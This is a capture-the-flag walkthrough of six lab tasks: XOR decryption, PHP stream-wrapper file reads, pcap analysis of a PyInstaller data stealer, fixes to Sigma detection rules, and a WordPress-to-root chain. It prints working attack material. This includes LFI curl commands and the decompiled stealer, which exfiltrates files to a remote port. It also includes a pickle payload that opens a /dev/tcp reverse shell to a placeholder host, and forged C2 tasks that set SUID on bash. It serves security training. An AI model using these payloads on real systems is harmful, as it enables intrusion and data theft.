# TryHackMe: Overflow The Jackpot — Walkthrough

**CTF:** Overflow The Jackpot  
**Tasks:** 6 — Intro · Crypto · Web · Forensics/RE · Detection Engineering · Boot2Root  

---

## Flag Summary

| Task | Name | Category | Flag |
|------|------|----------|------|
| 1 | Introduction and Rules | — | `THM{I_R3@d_Th3_Rul3s_aNd_ACKnowledge_Th3M}` |
| 2 | B1t Recovery | Crypto | `THM{X0r_K3y_r3c0verY_H4s_N3veR_B33n_Th1S_E@sy}` |
| 3 | Lost Fortune Included | Web / LFI | `THM{wr4pp3rs_sk1p_th3_wh1t3l1st}` |
| 4 | Casino Heist | Forensics / RE | `THM{J@ckP05_R0bb3ry_VIA_pYth0nN}` |
| 5 | Fresh Powder | Detection Engineering | 5 flags (see Task 5) |
| 6 | Agent P | Boot2Root | 3 flags (see Task 6) |

---

## Task 1 — Introduction and Rules

The first task was the CTF's front door — read the rules, acknowledge you've read them, collect the flag. No tricks, no tools. The flag was sitting right there in the briefing text:

```
THM{I_R3@d_Th3_Rul3s_aNd_ACKnowledge_Th3M}
```

The name says it all. On to the real work.

---

## Task 2 — B1t Recovery

The second task dropped a single binary file with no hints beyond the category label: **Crypto**. Opening it in a hex editor immediately ruled out anything structured — no file magic, no ASCII-printable runs, no compression headers. What I did notice was a repeating statistical pattern in the byte distribution. That signature, combined with the crypto category, pointed almost immediately to **repeating-key XOR**.

The question was the key length. I didn't need to brute-force it, though. Every THM flag starts with `THM{` — that's a free four-byte crib. XOR-ing the known prefix against the first four bytes of ciphertext gives you the first four key bytes directly:

```python
ct = open('mystery.bin', 'rb').read()
crib = b'THM{'
key_bytes = bytes(ct[i] ^ crib[i] for i in range(len(crib)))
print(key_bytes.hex())  # → cbcece43
```

Four bytes recovered. I checked whether the pattern repeated cleanly across the full ciphertext at that interval — it did. Key length confirmed: 4 bytes, key value `cbcece43`. Decrypting the whole file:

```python
key = bytes.fromhex('cbcece43')
pt = bytes(ct[i] ^ key[i % len(key)] for i in range(len(ct)))
print(pt.decode())
```

```
THM{X0r_K3y_r3c0verY_H4s_N3veR_B33n_Th1S_E@sy}
```

The flag named what just happened. Repeating-key XOR is broken the moment you have any known plaintext — `key = ciphertext XOR plaintext` is a definition, not a security property. One Python line from crib to key to flag.

---

## Task 3 — Lost Fortune Included

The briefing for Task 3 had a pointed hint: *"The usual tricks don't land here. Learn its language."* That line was doing real work — it was telling me something specific about the application's behavior, not just flavor text.

The page at `http://$IP/` linked to two documents via a `?doc=` parameter — `village_schedule.pdf` and `important.png` — and even displayed the request format in the UI: `?doc=<filename>`. I ran a Gobuster scan while reading the source, but it came back with only `index.php`. The entire attack surface was that one parameter.

My first instinct was path traversal. I tried the usual payloads — `?doc=../../../etc/passwd`, double-encoded slashes, null bytes — and hit a wall every time. The briefing had said as much. So instead of continuing to brute-force the obvious, I decided to read the application's source and understand exactly what it was doing.

The key was to use a PHP stream wrapper to read `index.php` itself:

```bash
curl -s "http://$IP/?doc=php://filter/convert.base64-encode/resource=index.php" | base64 -d
```

That returned the full source. The relevant section:

```php
$is_wrapper = (strpos($doc, '://') !== false);
if (!$is_wrapper) {
    $ext = strtolower(pathinfo($doc, PATHINFO_EXTENSION));
    if (!in_array($ext, ['pdf', 'png'])) {
        die('File type not allowed.');
    }
    $doc = str_replace('../', '', $doc);
    $path = '/var/www/html/village_docs/' . $doc;
} else {
    $path = $doc;  // ← wrappers bypass ALL validation
}
readfile($path);
```

There it was. Plain filenames hit two defenses: an extension whitelist enforcing `.pdf` or `.png`, and a single-pass `../` strip. That's why traversal didn't land — the strip catches it, and even if you bypassed the strip with `....//`, you'd still fail the extension check.

But wrappers take a completely different branch. The `else` clause hands the input directly to `readfile()` with absolutely no validation. The moment I spotted `$path = $doc`, I knew the path to the flag was wide open.

I swept likely flag locations using the bare wrapper — no base64 encoding needed since I wasn't reading PHP source this time, just text files:

```bash
for f in /flag.txt /var/www/html/flag.txt /var/www/flag.txt /root/flag.txt; do
  echo "=== $f ==="
  curl -s "http://$IP/?doc=php://filter/resource=$f"
done
```

The second sweep hit it:

```
=== /var/www/flag.txt ===
THM{wr4pp3rs_sk1p_th3_wh1t3l1st}
```

One directory above the webroot — unreachable through the whitelist path, but trivially readable through the unvalidated wrapper branch. The flag named the bug exactly: *wrappers skip the whitelist*. And the vulnerability and the recon tool were the same thing — the `php://filter` wrapper I used to read the source that revealed the whitelist was itself the bypass.

---

## Task 4 — Casino Heist

The briefing for Task 4 was written to be decoded before touching any tools:

> *"The getaway car itself went straight over the wire"* — a file was transferred over the network.  
> *"It left the keys sitting right there on the dashboard"* — the encryption key is hardcoded in that file.  
> *"Whoever built the getaway car in a hurry, never bothered hiding the parts under the hood"* — the binary isn't obfuscated.

So the chain was already clear: extract the binary from the pcap, reverse it to find the hardcoded key, locate the encrypted loot in the pcap, decrypt it. The attachment contained one file — `stolen_jackpot.pcapng`, about 20 MB — which I copied to the WSL home directory to avoid the I/O penalty of working off `/mnt/c`.

**Understanding the capture.** I started with a protocol hierarchy:

```bash
tshark -r stolen_jackpot.pcapng -q -z io,phs 2>/dev/null
```

701 frames, almost entirely TCP, with 55 KB of HTTP. Sorting TCP conversations by size revealed everything I needed:

- `172.20.0.1:60102 ↔ 172.20.0.2:8080` — ~20 MB in one HTTP stream. That's the "getaway car."
- `172.20.0.1 ↔ 172.20.0.3:4444` — two tiny streams (605 and 573 bytes). Port 4444 is the default Metasploit callback port. That's the exfil channel.

The HTTP requests confirmed it: `/stealer` got the 20 MB response, and two connections to port 4444 followed. I exported the HTTP objects:

```bash
mkdir -p ~/heist_objs
tshark -r stolen_jackpot.pcapng --export-objects "http,$HOME/heist_objs" -q 2>/dev/null
file ~/heist_objs/stealer
```

```
stealer: ELF 64-bit LSB executable, x86-64, stripped
```

Before even starting to reverse it, I ran `strings` — and three strings jumped out immediately: `pyi-python-flag`, `_MEIPASS`, and `PyRun_SimpleStringFlags`. Those are **PyInstaller** internal markers. The 20 MB "getaway car" wasn't a native binary — it was a Python script frozen into an ELF. That's the "never bothered hiding the parts under the hood." Python bytecode is recoverable.

**Pulling the loot from port 4444.** While unpacking the binary, I pulled the raw bytes from the exfil streams:

```bash
tshark -r stolen_jackpot.pcapng -q -z follow,tcp,raw,4 2>/dev/null
```

Both streams had the same structure: `666c61672e6a61636b706f74` (`flag.jackpot`) + `0a` (`\n`) + encrypted bytes. Stream 4 had 48 bytes of ciphertext (3 blocks), stream 5 had 16 (1 block). Forty-eight bytes is the full padded flag file; 16 bytes is a tail fragment from a second exfil attempt.

**Unpacking and decompiling.** `pyinstxtractor-ng` extracted the bytecode bundle, and the main script landed as `stealer.pyc`. Standard Python decompilers (`decompyle3`, `uncompyle6`) choked on Python 3.10 bytecode, so I built `pycdc` from source:

```bash
git clone https://github.com/zrax/pycdc.git /tmp/pycdc
cd /tmp/pycdc && cmake . && make
/tmp/pycdc/pycdc stealer_extracted/stealer.pyc
```

The full source came out clean:

```python
KEY = b'J4ckp0tH4ck3rKey'
IV  = b'Iv_For_Exf1ltr8!'
HOST = '172.20.0.3'
PORT = 4444

def run():
    if socket.gethostname() != 'b0x':
        raise SystemExit
    for root, _, files in os.walk('/home'):
        for f in files:
            if f.endswith('.jackpot'):
                data = open(os.path.join(root, f), 'rb').read()
                enc = AES.new(KEY, AES.MODE_CBC, IV).encrypt(pad(data, 16))
                s = socket.socket()
                s.connect((HOST, PORT))
                s.sendall(f.encode() + b'\n' + enc)
                s.close()
run()
```

**AES-128-CBC, both key and IV hardcoded in plaintext.** The briefing wasn't exaggerating — the keys were literally sitting on the dashboard.

Worth noting: `strings` had shown `J4ckp0tH4ck3rKeys` — with a trailing `s`. I initially tried using that as the key and got garbage. The decompile clarified it: the `s` was the start of the next adjacent string bleeding in. The real key ends at `...Key`, 16 bytes exactly. This is why you decompile instead of trusting `strings` for crypto material.

I also tried repeating-key XOR first, since the "built in a hurry" framing suggested a lazy cipher. That output was clearly garbage, which confirmed AES before I'd even seen the source. The decompile just told me which mode and gave me the IV.

**Decrypting the loot:**

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

KEY = b"J4ckp0tH4ck3rKey"
IV  = b"Iv_For_Exf1ltr8!"
ct  = bytes.fromhex("9bcc341f8374f7d031a5a0ee4663501313b15466b184e33a3f295efd0cd1b4f5c64b48dd831bbca7ec4423e3782f8fe5")
pt  = unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(ct), 16)
print(pt)
```

```
b'THM{J@ckP05_R0bb3ry_VIA_pYth0nN}'
```

Stream 5 unpaddded to empty — it was just the padding block from a partial second exfil run. Stream 4 had the full flag.

```
THM{J@ckP05_R0bb3ry_VIA_pYth0nN}
```

---

## Task 5 — Fresh Powder (Bonus Challenge)

Task 5 was a Detection-as-Code challenge, and it was a different animal from everything before it. Instead of attacking a target, I was playing defense — fixing broken Sigma detection rules inside a simulated Git-based CI/CD pipeline. Five pull requests were open in the repo, each containing a detection rule written in response to a real (fictional) intrusion by a threat group called POWDER WOLF at the Meridian Defense Research Institute. Each rule had a deliberate flaw. My job was to find it, fix it, and get the rule through four automated pipeline checks: Sigma syntax validation, Splunk conversion, environment validation against real telemetry, and an automated red team test. Merging a passing PR released a flag.

**PR #1 — External RDP Logon from an Untrusted Source (T1133)**

The first rule was supposed to catch interactive RDP logons arriving from outside Cascadia's known network ranges — exactly how POWDER WOLF got in, using source IPs in `203.0.113.x`. I read through the detection logic and immediately spotted the problem. The filter was set up to exclude `203.0.113.x` — the *attacker's* range — from alerting. The rule was suppressing the exact events it was supposed to catch. Classic inverted logic.

The fix was to flip the filter entirely: exclude the *legitimate* internal ranges (RFC1918 space) and alert on whatever's left. I also noticed the rule only caught LogonType 10 (initial RDP connection), but RDP reconnect sessions use LogonType 7. The incident report showed both, so I added that too:

```yaml
detection:
  selection:
    EventID: 4624
    LogonType|in:
      - '10'
      - '7'
  filter_known_range:
    IpAddress|startswith:
      - '10.'
      - '172.16.'
      - '192.168.'
  filter_known_accounts:
    SubjectUserName|endswith: '$'
  condition: selection and not filter_known_range and not filter_known_accounts
```

Pipeline passed. **Flag: `THM{Untru5ted_R4nge_Bu5ted}`**

**PR #2 — NetScan Enumerates Writable Shares via a Delete.me Test (T1135)**

The second rule targeted NetScan's write-access test — the tool creates a `delete.me` marker file on each admin share it can write to. The original rule keyed on `ShareName|endswith: 'delete.me'`. I ran that SPL against the telemetry: zero hits. Checked the event structure for Event ID 5145, and the issue was immediately clear. In a 5145 event, `delete.me` is the `RelativeTargetName` — the file being accessed. The `ShareName` is the share path itself, like `\\DC-CSRC01\C$`. Wrong field, zero TPs.

```yaml
detection:
  selection:
    EventID: 5145
    RelativeTargetName|endswith: 'delete.me'
  condition: selection
```

Environment validation came back with 16 TPs — a tight 7-minute burst of write-test events sweeping admin shares across the DC and file server tiers — and zero FPs. **Flag: `THM{D3l3t3_M3_G1v3s_1t_4w4y}`**

**PR #3 — Remote Access Tool Installed as a Service (T1543.003)**

This one had two problems layered on top of each other. The original rule matched `Image|endswith: '\\AnyDesk.exe'` in process creation events. Problem one: service installs aren't process creation — they're **Event ID 7045**, with the binary path in `ServiceFileName`, not `Image`. The rule was looking in the wrong place entirely. Problem two: AnyDesk is legitimately deployed on workstations by the helpdesk, so even if we fixed the event, alerting on any AnyDesk process would flood with FPs from the end-user population.

The anomaly from the incident report was AnyDesk installed as a service specifically on *server infrastructure* — domain controllers, backup servers, hypervisors. The helpdesk never touches those with remote access tools. So the fix was to key on Event ID 7045, broaden to the full RAT family (not just AnyDesk, since an attacker could trivially swap vendors), and exclude the workstation tier:

```yaml
detection:
  selection:
    EventID: 7045
    ServiceName|contains:
      - 'AnyDesk'
      - 'TeamViewer'
      - 'RemotePC'
      - 'ScreenConnect'
  filter_workstations:
    ComputerName|startswith: 'WKS-'
  condition: selection and not filter_workstations
```

Pipeline passed clean. **Flag: `THM{Ban1ked_4ccess_Ch4nnel}`**

**PR #4 — 7-Zip Archives Data Directly from a Live Network Share (T1560.001)**

The fourth rule was supposed to catch the attacker staging data for exfil by archiving directly from a live network share. The original logic matched `CommandLine|contains: '-p'` — the 7-Zip password flag. I pulled the attack command from the incident report: `7zG.exe a -tzip "ResortGuestData.zip" "\\FS-RESV01\ReservationsShare\*"`. No `-p` anywhere. Zero TPs again — the rule was keying on a flag that wasn't in the actual attack command.

The real discriminator was the UNC path in the source. Normal users archive local documents; the attacker archived directly from a share. I also anchored on `OriginalFileName` PE metadata rather than the binary path — an attacker who knows the environment can rename `7z.exe` to something innocuous, but they can't change the PE metadata without recompiling. A legitimate monthly backup job that also archived from a share needed filtering too:

```yaml
detection:
  selection:
    OriginalFileName|endswith:
      - '7z.exe'
      - '7zG.exe'
      - '7zFM.exe'
      - 'WinRAR.exe'
    CommandLine|contains: '\\\\'
  filter_monthly_backup:
    CommandLine|contains:
      - 'BackupShare'
      - 'MonthlyArchive'
  condition: selection and not filter_monthly_backup
```

**Flag: `THM{Z1pp3d_R1ght_0ut_th3_D00r}`**

**PR #5 — Lynx Ransomware Payload Executed with Distinctive Encryption Flags (T1486)**

The last rule was the most interesting, partly because it had the most layered misdirection. The original detection required `ParentImage|endswith: '\\services.exe'` — but the incident report showed the attacker launched the payload manually from `cmd.exe`. Missed the attack entirely. Easy fix: remove the parent requirement. But then the red team ran, and it came back with three failures.

The pipeline had planted a decoy: a legitimate disk maintenance tool called `DiskOptimizer.exe`, which ran nightly from `C:\Program Files\ITOpsTools\` with flags `--dir C:\ --mode fast --schedule nightly`. The ransomware had been configured to use the *same* `--dir` and `--mode fast` flags. Any detection that keyed on those flags alone would fire on 14 legitimate DiskOptimizer runs per day. The red team was also testing whether I'd anchor too hard on the parent process (evadable by launching from PowerShell or directly) or on specific flags (which the attacker could vary run to run).

The solution was to key on the *behavioral combination* — multiple encryption-relevant flags together — and exclude DiskOptimizer by anchoring on *both* its `OriginalFileName` PE metadata and its known install path. Path alone wasn't sufficient: the red team proved that an attacker who maps the environment can drop a renamed payload in `\ITOpsTools\` to inherit the path-based exclusion. Both had to match before the exclusion applied:

```yaml
detection:
  selection:
    CommandLine|contains|all:
      - '--dir'
      - '--mode'
      - '--verbose'
  filter_disk_optimizer:
    OriginalFileName: 'DiskOptimizer.exe'
    Image|contains: '\ITOpsTools\'
  condition: selection and not filter_disk_optimizer
```

Parent-agnostic, behavior-anchored, exclusion requiring both metadata and path. Four TP, zero FP, all red team bypass attempts passed. **Flag: `THM{C4ught_B3f0re_th3_Th4w}`**

---

## Task 6 — Agent P

Task 6 was the capstone — a full Boot2Root with three flags and an escalation chain that ran from WordPress foothold through pickle deserialization to reverse-engineered C2 cryptography. The target was running WordPress 6.9 on port 80 and OpenSSH on port 22, nothing else.

**Flags:**

| Stage | User | Flag |
|-------|------|------|
| Low-privileged | norm | `EVILINC{n0rm_r34ds_th3_db_l1k3_4_g00d_r0b0t}` |
| Operator | vanessa | `EVILINC{p1ckl3_s4ndb0x3s_4r3_n0t_s4ndb0x3s}` |
| Root | root | `EVILINC{d00f_r0ll3d_h1s_0wn_crypt0_4nd_p3rry_w0n}` |

### Foothold — WordPress RCE as www-data

WordPress 6.9 is vulnerable to a pre-authentication RCE chain nicknamed **wp2shell**, combining CVE-2026-63030 (REST API batch-route confusion) and CVE-2026-60137 (SQL injection in the `author__not_in` query parameter). The chain worked in two phases: first, exploit the SQLi through the batch endpoint to inject a temporary administrator account into the database; second, authenticate to the WordPress admin panel with those credentials and upload a minimal PHP webshell plugin. The temp account self-cleaned after use, leaving just the webshell.

From there I spent time mapping the system as `www-data`. The interesting things were deeper than the webroot:

- `norm` (uid 1001) and `vanessa` (uid 1002) both had shells and were both in the `evilinc` group
- An internal Flask/gunicorn app was running on `127.0.0.1:8700` as `vanessa`
- `/opt/evilinc/implant` — a stripped 14KB ELF — was running as root under systemd
- `/run/evilinc/tasking.sock` was a Unix socket owned `root:vanessa` with group write permission
- `/etc/evilinc/panel.conf` was readable by the `evilinc` group

The systemd service files filled in the picture: the implant polls the tasking socket for jobs, a C2 tasking server queues them, and the Flask panel is the operator interface — all running as root or vanessa. This was the escalation path in skeleton form.

### norm — Database Enumeration

WordPress database credentials were sitting in `wp-config.php`: `wpuser:wp_WjURfdI`. I queried the database and listed the tables — most were standard WordPress tables, but one stood out immediately: `wp_infra_accounts`. That's not a WordPress table. Querying it:

```
host_user: norm
host_pass: N0rm_th3_r0b0t_2026
note: ssh sync target for the -inator newsletter cron
```

Cleartext credentials for a system user, stored in the web application's database. SSH'd in as `norm`, picked up the first flag in `/home/norm/user.txt`:

```
EVILINC{n0rm_r34ds_th3_db_l1k3_4_g00d_r0b0t}
```

### vanessa — Pickle Deserialization with a Blocklist Bypass

With a shell as `norm`, I could now read `/etc/evilinc/panel.conf` (norm is in the `evilinc` group, and the file is group-readable):

```
operator_secret = b3hind_sch3dul3_th1s_m0nth
```

The Flask panel at `127.0.0.1:8700` authenticates via `POST /api/login` with that secret, setting an `op_token` cookie. The authenticated `POST /api/blueprints/import` endpoint accepted base64-encoded data and deserialized it through a "restricted" unpickler. The blueprint export endpoint confirmed the format: pickle protocol 4, the `gASV` prefix.

The unpickler blocklisted dangerous root modules by name — `os`, `posix`, `subprocess`, `builtins`, `pty`, `sys`, `ctypes`, and more. The canonical pickle payload uses `os.system`, which serializes internally as `posix.system`. Blocked. I tried `subprocess.Popen`. Blocked. `builtins.eval`. Blocked.

The key insight, which the app's own source comment spelled out (readable after getting a shell later): the blocklist only operates at *unpickle time*, gating which module globals can be resolved. It does nothing about what code executes at *runtime* after the object is constructed. Any allowed module that accepts a Python string and evaluates it at runtime is a complete bypass.

`timeit.timeit` fits that description exactly. It accepts a Python string as its first argument and executes it. By the time `__import__('os')` runs inside the string, the unpickler has already finished:

```python
import pickle, base64, timeit

class E:
    def __reduce__(self):
        return (timeit.timeit, (
            "__import__('os').system('bash -c \"bash -i >& /dev/tcp/KALI_IP/4444 0>&1\"')",
            'pass', timeit.default_timer, 1
        ))

payload = base64.b64encode(pickle.dumps(E())).decode()
```

Sent via `curl` from norm's session with the operator cookie. The Flask process — running as `vanessa` — deserialized the payload and the reverse shell connected. Second flag in `/home/vanessa/operator.txt`:

```
EVILINC{p1ckl3_s4ndb0x3s_4r3_n0t_s4ndb0x3s}
```

### root — Reverse-Engineering the C2 Signing Key

With a shell as `vanessa`, I could write to `/run/evilinc/tasking.sock`. I probed it to understand the protocol. `POLL 1` returned a flood of queued tasks in the format `id|type|cmd|nonce|sig`, confirming the pipe-delimited structure I'd seen in the implant's `strings` output. `SUBMIT <task>|<sig>` with `ERR expected id|type|cmd|nonce|sig` when the format was wrong, and `ERR id must exceed current max` once the format was right — meaning signature validation came after ID validation.

Two more things I figured out through probing. First, when I submitted tasks with IDs like `9999`, they were accepted by the server but the implant never picked them up. The binary contained the format string `POLL %ld` — the implant polls by passing the current Unix timestamp as a long integer. The queue already had tasks up to around ID 5730 (sysinfo heartbeat tasks), but anything below ~1.79 billion was below the implant's poll cursor. Tasks had to have IDs in the current timestamp range to be visible.

Second, submitting with a fake 64-character hex signature and a high timestamp-range ID returned `OK` once — but the tasks still didn't execute. The server accepted the format but the implant must verify signatures before running `exec` commands.

I needed the real signing key. The implant was a 14KB stripped ELF — small enough to reverse properly. I exfiltrated it via base64 through the webshell and analyzed it with `objdump` and `readelf` on Kali.

The `.rodata` section at offset `0x2020` held 32 non-printable bytes. A function at `0x1449` was a linear congruential generator — I could read the constants directly from the disassembly: seed `0x1a2b3c4d`, multiplier `0x41c64e6d`, increment `0x3039`, output `(state >> 16) & 0xff`. A XOR loop at `0x14e0` combined the rodata bytes with the LCG output to produce a derived key. Then an HMAC-SHA256 call used that derived key against the machine-id string to produce the final signing key.

I implemented the derivation and tested it against a known signature from the POLL queue:

```python
def lcg(n, seed=0x1a2b3c4d):
    out, s = [], seed
    for _ in range(n):
        s = (s * 0x41c64e6d + 0x3039) & 0xffffffff
        out.append((s >> 16) & 0xff)
    return bytes(out)

rodata = bytes([0x15,0x88,0xc5,0x7c,0x02,0x6a,0xe5,0xeb,
                0x9c,0x2d,0x18,0x17,0xaf,0x48,0xf7,0x09,
                0x64,0xef,0xff,0x76,0x5e,0x58,0xd1,0x12,
                0xd8,0xf1,0x16,0xd7,0x0f,0x99,0x41,0xb4])

dk = bytes(a ^ b for a, b in zip(rodata, lcg(32)))
signing_key = hmac.new(dk, b'ec237b10a5f6e959a3088340f9904b31',
                       hashlib.sha256).digest()

# Verify against known queue signature
sig = hmac.new(signing_key, b'10|sysinfo|uptime|1000', hashlib.sha256).hexdigest()
# → 2b33d3bf90540c999ecd917150e514240cc02cef3cd4fece3486790681103718 ✓
```

Match. From vanessa's shell, I forged properly-signed exec tasks with timestamp-range IDs and submitted them to the socket:

```python
ts = int(time.time())
for i, cmd in enumerate(['cat /root/root.txt>/tmp/rf', 'chmod 4755 /bin/bash']):
    tid = ts + 3000 + i
    nonce = tid * 10
    task_str = f'{tid}|exec|{cmd}|{nonce}'
    sig = hmac.new(signing_key, task_str.encode(), hashlib.sha256).hexdigest()
    sock.sendall(f'SUBMIT {task_str}|{sig}\n'.encode())
```

Twenty seconds later — enough time for the implant's next poll cycle — the root flag was in `/tmp/rf` and `/bin/bash` had its SUID bit set.

```bash
cat /tmp/rf
# EVILINC{d00f_r0ll3d_h1s_0wn_crypt0_4nd_p3rry_w0n}

/bin/bash -p
bash-5.2# id
uid=1002(vanessa) gid=1003(vanessa) euid=0(root)
```

The flag said it all: Doof rolled his own crypto, and Perry won.

---

## Key Takeaways

**Know your primitives.** Four of the six tasks were solvable the moment you recognized the underlying primitive — repeating-key XOR (crib-drag it), PHP stream wrappers (they bypass the whitelist branch), PyInstaller (decompile it), pickle blocklists (runtime eval gadgets bypass them). Pattern recognition is faster than brute force.

**Read the source before you brute-force.** Task 3 explicitly told you that traversal wouldn't work. Task 4's briefing told you the key was in the binary. Task 6's architecture was readable from systemd service files before any exploitation. The application tells you how to beat it if you read carefully.

**Protocol analysis beats guessing.** The timestamp-as-poll-ID insight in Task 6 came from one format string in the binary (`POLL %ld`), not from trying thousands of ID ranges. The signing key derivation came from reading 50 lines of disassembly. When something isn't working, step back and understand the system.

**Detection engineering is about the behavior, not the artifact.** Task 5 taught this five times in different flavors: the inverted filter (wrong direction), the wrong field (right event, wrong attribute), the single-vendor rule (too narrow), the missing path anchor (survives renaming), and the flag-based anchor (too brittle). Every one of those is a bypass a real attacker would find in the first five minutes.
